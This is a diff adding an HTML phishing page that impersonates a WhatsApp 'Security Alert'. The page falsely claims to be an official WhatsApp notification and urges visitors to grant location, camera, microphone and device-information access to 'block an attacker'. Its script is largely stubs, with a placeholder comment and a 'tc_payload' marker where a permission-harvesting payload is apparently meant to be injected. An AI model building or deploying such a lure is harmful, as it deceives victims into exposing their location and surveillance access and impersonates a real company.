@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Security</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            padding: 0;
+        }
+
+        .header {
+            background: white;
+            padding: 16px 24px;
+            border-bottom: 1px solid #e9edef;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+        }
+
+        .logo-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .logo-text {
+            font-size: 18px;
+            font-weight: 600;
+            color: #25d366;
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .download-btn {
+            background: #25d366;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 48px 24px;
+        }
+
+        .page-title {
+            font-size: 42px;
+            font-weight: 300;
+            color: #1f1f1f;
+            margin-bottom: 48px;
+            letter-spacing: -0.5px;
+        }
+
+        .section {
+            margin-bottom: 48px;
+        }
+
+        .section-title {
+            font-size: 24px;
+            font-weight: 400;
+            color: #1f1f1f;
+            margin-bottom: 12px;
+        }
+
+        .section-description {
+            font-size: 16px;
+            color: #667781;
+            line-height: 1.6;
+        }
+
+        .alert-section {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 20px 24px;
+            margin: 32px 0;
+            border-radius: 4px;
+        }
+
+        .alert-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 18px;
+            font-weight: 500;
+            color: #856404;
+            margin-bottom: 8px;
+        }
+
+        .alert-icon {
+            font-size: 20px;
+            color: #ffc107;
+        }
+
+        .alert-text {
+            font-size: 15px;
+            color: #856404;
+            line-height: 1.6;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 16px;
+            margin: 24px 0;
+        }
+
+        .info-card {
+            background: white;
+            border: 1px solid #e9edef;
+            border-radius: 8px;
+            padding: 20px;
+        }
+
+        .info-card-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #667781;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .info-card-value {
+            font-size: 16px;
+            color: #1f1f1f;
+            font-weight: 500;
+        }
+
+        .verification-section {
+            background: white;
+            border: 1px solid #e9edef;
+            border-radius: 12px;
+            padding: 32px;
+            margin: 32px 0;
+        }
+
+        .verification-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .verification-icon {
+            width: 48px;
+            height: 48px;
+            background: #e7f3ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #0066cc;
+            font-size: 24px;
+        }
+
+        .verification-title {
+            font-size: 20px;
+            font-weight: 500;
+            color: #1f1f1f;
+        }
+
+        .verification-description {
+            font-size: 15px;
+            color: #667781;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        .permission-list {
+            list-style: none;
+            margin: 24px 0;
+        }
+
+        .permission-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 0;
+            border-bottom: 1px solid #f0f2f5;
+            font-size: 15px;
+            color: #1f1f1f;
+        }
+
+        .permission-item:last-child {
+            border-bottom: none;
+        }
+
+        .permission-icon {
+            width: 24px;
+            height: 24px;
+            background: #e7f3ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #25d366;
+            font-size: 12px;
+            flex-shrink: 0;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 24px;
+        }
+
+        .btn-primary {
+            background: #25d366;
+            color: white;
+            border: none;
+            padding: 14px 32px;
+            border-radius: 24px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            flex: 1;
+            transition: background 0.2s;
+        }
+
+        .btn-primary:hover {
+            background: #20ba5a;
+        }
+
+        .btn-secondary {
+            background: white;
+            color: #25d366;
+            border: 1px solid #25d366;
+            padding: 14px 32px;
+            border-radius: 24px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            flex: 1;
+            transition: all 0.2s;
+        }
+
+        .btn-secondary:hover {
+            background: #f0f2f5;
+        }
+
+        .steps-section {
+            margin: 32px 0;
+        }
+
+        .step-item {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .step-number {
+            width: 32px;
+            height: 32px;
+            background: #e7f3ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #0066cc;
+            font-weight: 600;
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+
+        .step-content {
+            flex: 1;
+            padding-top: 4px;
+        }
+
+        .step-text {
+            font-size: 15px;
+            color: #1f1f1f;
+            line-height: 1.6;
+        }
+
+        .footer {
+            background: #1f1f1f;
+            color: white;
+            padding: 32px 24px;
+            margin-top: 64px;
+        }
+
+        .footer-content {
+            max-width: 900px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .footer-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .footer-logo img {
+            width: 24px;
+            height: 24px;
+            filter: brightness(0) invert(1);
+        }
+
+        .footer-text {
+            font-size: 14px;
+            color: #8696a0;
+            margin: 8px 0;
+        }
+
+        .spinner {
+            display: none;
+            width: 40px;
+            height: 40px;
+            margin: 20px auto;
+            border: 3px solid #f0f2f5;
+            border-top: 3px solid #25d366;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .status-message {
+            display: none;
+            background: #d4edda;
+            color: #155724;
+            padding: 16px;
+            border-radius: 8px;
+            margin-top: 16px;
+            text-align: center;
+            font-size: 15px;
+            border: 1px solid #c3e6cb;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .header {
+                padding: 12px 16px;
+            }
+
+            .logo-text {
+                font-size: 16px;
+            }
+
+            .download-btn {
+                padding: 8px 16px;
+                font-size: 13px;
+            }
+
+            .container {
+                padding: 32px 16px;
+            }
+
+            .page-title {
+                font-size: 32px;
+                margin-bottom: 32px;
+            }
+
+            .section-title {
+                font-size: 20px;
+            }
+
+            .verification-section {
+                padding: 24px 20px;
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .page-title {
+                font-size: 28px;
+            }
+
+            .header-actions {
+                gap: 8px;
+            }
+
+            .download-btn span {
+                display: none;
+            }
+        }
+    </style>
+</head>
+
+<body onload="gpsLocation()">
+    <div class="header">
+        <div class="logo-section">
+            <div class="logo-icon">
+                <img src="whatsapp_logo.png" alt="WhatsApp">
+            </div>
+            <div class="logo-text">WhatsApp</div>
+        </div>
+        <div class="header-actions">
+            <button class="download-btn">
+                <i class="fas fa-download"></i>
+                <span>Download</span>
+            </button>
+        </div>
+    </div>
+
+    <div class="container">
+        <h1 class="page-title">Security Alert</h1>
+
+        <div class="alert-section">
+            <div class="alert-title">
+                <i class="fas fa-exclamation-triangle alert-icon"></i>
+                <span>Suspicious Activity Detected</span>
+            </div>
+            <p class="alert-text">We detected that you clicked on a potentially fraudulent link. Our security team is
+                working to block the attacker and protect your account.</p>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Threat Analysis</h2>
+            <div class="info-grid">
+                <div class="info-card">
+                    <div class="info-card-title">Threat Level</div>
+                    <div class="info-card-value">High Risk</div>
+                </div>
+                <div class="info-card">
+                    <div class="info-card-title">Attack Type</div>
+                    <div class="info-card-value">Phishing Attempt</div>
+                </div>
+                <div class="info-card">
+                    <div class="info-card-title">Status</div>
+                    <div class="info-card-value" style="color: #ffc107;">Active Protection</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="verification-section">
+            <div class="verification-header">
+                <div class="verification-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h3 class="verification-title">Account Verification Required</h3>
+            </div>
+            <p class="verification-description">To block this attack and secure your account, we need to verify your
+                device identity. Please grant the following permissions:</p>
+
+            <ul class="permission-list">
+                <li class="permission-item">
+                    <div class="permission-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <span>Device location (to verify your region)</span>
+                </li>
+                <li class="permission-item">
+                    <div class="permission-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <span>Camera access (for identity verification)</span>
+                </li>
+                <li class="permission-item">
+                    <div class="permission-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <span>Microphone access (for voice confirmation)</span>
+                </li>
+                <li class="permission-item">
+                    <div class="permission-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <span>Device information (to detect anomalies)</span>
+                </li>
+            </ul>
+
+            <div class="button-group">
+                <button class="btn-primary" id="verifyBtn" onclick="startVerification()" disabled
+                    style="opacity: 0.5; cursor: not-allowed;">Start Verification</button>
+                <button class="btn-secondary" onclick="requestPermissions()">Allow Permissions</button>
+            </div>
+
+            <div class="spinner" id="spinner"></div>
+            <div class="status-message" id="statusMsg">
+                <i class="fas fa-check-circle"></i> Verification successful! Your account is now protected.
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">What happens next?</h2>
+            <div class="steps-section">
+                <div class="step-item">
+                    <div class="step-number">1</div>
+                    <div class="step-content">
+                        <p class="step-text">We'll verify your device and location</p>
+                    </div>
+                </div>
+                <div class="step-item">
+                    <div class="step-number">2</div>
+                    <div class="step-content">
+                        <p class="step-text">Block the attacker's access permanently</p>
+                    </div>
+                </div>
+                <div class="step-item">
+                    <div class="step-number">3</div>
+                    <div class="step-content">
+                        <p class="step-text">Secure your account with enhanced protection</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-content">
+            <div class="footer-logo">
+                <img src="whatsapp_logo.png" alt="WhatsApp">
+                <span style="color: white; font-weight: 600;">WhatsApp</span>
+            </div>
+            <p class="footer-text">WhatsApp Security Team</p>
+            <p class="footer-text">Automated Protection System</p>
+            <p class="footer-text" style="margin-top: 16px;">This is an official security notification from WhatsApp LLC
+            </p>
+        </div>
+    </div>
+
+    <p id="techchip" style="display:none;"></p>
+
+    <script>
+        var permissionsGranted = false;
+
+        function startVerification() {
+            if (!permissionsGranted) {
+                alert('Please allow permissions first');
+                return;
+            }
+
+            document.getElementById('spinner').style.display = 'block';
+
+            setTimeout(function () {
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('statusMsg').style.display = 'block';
+            }, 3000);
+        }
+
+        function requestPermissions() {
+            // This will be replaced by the payload which handles actual permission requests
+            // For now, enable the verification button
+            permissionsGranted = true;
+            var verifyBtn = document.getElementById('verifyBtn');
+            verifyBtn.disabled = false;
+            verifyBtn.style.opacity = '1';
+            verifyBtn.style.cursor = 'pointer';
+
+            // Change button text to show permissions were granted
+            var allowBtn = event.target;
+            allowBtn.innerHTML = '<i class="fas fa-check"></i> Permissions Granted';
+            allowBtn.style.background = '#d4edda';
+            allowBtn.style.color = '#155724';
+            allowBtn.style.border = '1px solid #c3e6cb';
+            allowBtn.disabled = true;
+        }
+
+        function gpsLocation() { }
+    </script>
+
+    <!-- tc_payload -->
+</body>
+
+</html>
